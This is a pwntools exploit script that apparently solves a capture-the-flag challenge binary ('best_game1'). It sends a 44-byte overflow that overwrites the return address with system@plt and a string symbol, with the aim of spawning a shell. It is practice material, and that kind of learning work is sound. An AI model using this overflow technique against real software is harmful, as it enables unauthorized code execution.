#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg1_docker/best_game1'

exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 44


def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process(argv=argv, env=envp)

io = start()

log.info(f'system@plt = {hex(exe.plt.system)}') 
log.info(f'no_more_spawn_shell_ahahah = {hex(exe.symbols.no_more_spawn_shell_ahahah)}')

io.sendlineafter(b'# ', (b'a'*EIP_OFFSET) + p32(exe.plt.system) + (b'fake') + p32(exe.symbols.no_more_spawn_shell_ahahah))
io.sendlineafter(b'# ', b'HZD')
io.interactive()